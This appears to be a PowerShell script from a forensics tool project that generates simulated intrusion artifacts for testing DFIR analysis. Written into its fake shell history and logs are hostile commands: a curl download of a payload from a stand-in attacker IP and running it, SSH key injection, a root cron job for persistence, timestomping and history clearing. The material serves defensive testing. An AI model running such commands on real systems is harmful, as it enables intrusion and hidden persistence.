<#
.SYNOPSIS
    CHRONO-SHARD :: Windows DFIR Cyber Attack Simulation Script (Safe & Reversible)
.DESCRIPTION
    Simulates a multi-stage intrusion timeline matching MITRE ATT&CK techniques:
    - Initial Access & Ingress Tool Transfer (T1105)
    - Execution (T1059)
    - Privilege Escalation (T1548)
    - Defense Evasion & Timestomping (T1070.006, T1070.003)
    - Persistence (T1053, T1543)
.PARAMETER Clean
    Restores the environment to baseline by cleaning up all generated test artifacts.
#>

param(
    [switch]$Clean
)

$ErrorActionPreference = "Stop"

$TestDir = Join-Path $PSScriptRoot "..\test_artifacts"
$LogsDir = Join-Path $PSScriptRoot "..\logs"

if ($Clean) {
    Write-Host "[*] Cleaning up CHRONO-SHARD simulation artifacts..." -ForegroundColor Yellow
    if (Test-Path $TestDir) { Remove-Item -Path $TestDir -Recurse -Force }
    if (Test-Path $LogsDir) { Remove-Item -Path $LogsDir -Recurse -Force }
    Write-Host "[+] All simulation artifacts successfully removed." -ForegroundColor Green
    exit 0
}

Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host "  CHRONO-SHARD :: LIVE CYBER ATTACK SIMULATOR (SAFE & ISOLATED)  " -ForegroundColor Cyan
Write-Host "==================================================================" -ForegroundColor Cyan

# Ensure target directories exist
New-Item -ItemType Directory -Path "$TestDir\persistence" -Force | Out-Null
New-Item -ItemType Directory -Path $LogsDir -Force | Out-Null

# 1. Reconnaissance & Ingress Payload
Write-Host "[1/5] Simulating Initial Access & Ingress Tool Transfer (T1105)..." -ForegroundColor White
$PayloadPath = Join-Path $TestDir ".sh_cache_payload"
$PayloadContent = @"
#!/usr/bin/env bash
# [SIMULATED DFIR TEST PAYLOAD]
ATTACKER_C2="198.51.100.24:4444"
echo "[*] Connecting to C2 endpoint: `$ATTACKER_C2"
"@
Set-Content -Path $PayloadPath -Value $PayloadContent

# 2. Defense Evasion - Timestomping (T1070.006)
Write-Host "[2/5] Simulating Inode Timestomping on dropped payload (T1070.006)..." -ForegroundColor White
$Backdate = (Get-Date).AddDays(-3)
(Get-Item $PayloadPath).LastWriteTimeUtc = $Backdate
(Get-Item $PayloadPath).LastAccessTimeUtc = $Backdate
Write-Host "      Timestomped $PayloadPath modified time to $Backdate" -ForegroundColor DarkGray

# 3. Simulated Auth Log with Brute Force & Sudo Abuse (T1110, T1548.003)
Write-Host "[3/5] Injecting high-signal authentication & privilege escalation telemetry..." -ForegroundColor White
$NowIso = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
$SyslogTime = (Get-Date).ToString("MMM dd HH:mm:ss")
$AuthLogContent = @"
$SyslogTime node-win sshd[8012]: Failed password for invalid user admin from 198.51.100.24 port 51234 ssh2
$SyslogTime node-win sshd[8013]: Failed password for invalid user root from 198.51.100.24 port 51236 ssh2
$SyslogTime node-win sshd[8015]: Accepted publickey for secops from 198.51.100.24 port 51240 ssh2
$SyslogTime node-win sudo: secops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c chmod +x /tmp/.sh_cache_payload
$SyslogTime node-win useradd[8099]: new user: name=ghost_admin
$SyslogTime node-win sudo: secops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab /etc/cron.d/sys_update
"@
Set-Content -Path (Join-Path $LogsDir "auth.log") -Value $AuthLogContent
Set-Content -Path (Join-Path $TestDir "auth.log") -Value $AuthLogContent

# 4. Shell History Obfuscation & Timestomped Command Log (T1059, T1070.003)
Write-Host "[4/5] Injecting extended shell history & cleanup sequences..." -ForegroundColor White
$UnixEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$ShellHistoryContent = @"
: $($UnixEpoch - 120):0;whoami
: $($UnixEpoch - 110):0;uname -a
: $($UnixEpoch - 100):0;netstat -tulpn
: $($UnixEpoch - 90):0;curl -s http://198.51.100.24/payload.sh -o /tmp/.sh_cache_payload
: $($UnixEpoch - 80):0;touch -r /bin/ls /tmp/.sh_cache_payload
: $($UnixEpoch - 70):0;chmod +x /tmp/.sh_cache_payload
: $($UnixEpoch - 60):0;/tmp/.sh_cache_payload --daemon
: $($UnixEpoch - 50):0;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys
: $($UnixEpoch - 40):0;echo "* * * * * root /tmp/.sh_cache_payload > /dev/null 2>&1" > /etc/cron.d/sys_update
: $($UnixEpoch - 20):0;history -c
"@
Set-Content -Path (Join-Path $TestDir "shell_history.txt") -Value $ShellHistoryContent

# 5. Persistence Hook (T1053.003)
Write-Host "[5/5] Staging persistence crontab artifact (T1053)..." -ForegroundColor White
$CronContent = @"
# Automated telemetry monitor
* * * * * root /tmp/.sh_cache_payload >/dev/null 2>&1
"@
Set-Content -Path (Join-Path $TestDir "persistence\sys_update") -Value $CronContent

Write-Host "==================================================================" -ForegroundColor Green
Write-Host "  ATTACK SIMULATION READY FOR CHRONO-SHARD DFIR ANALYSIS!        " -ForegroundColor Green
Write-Host "  Test Artifacts: $TestDir" -ForegroundColor White
Write-Host "  Run: cargo run --release -- --simulate" -ForegroundColor Yellow
Write-Host "  Cleanup: .\scripts\simulate_attack.ps1 -Clean" -ForegroundColor DarkGray
Write-Host "==================================================================" -ForegroundColor Green
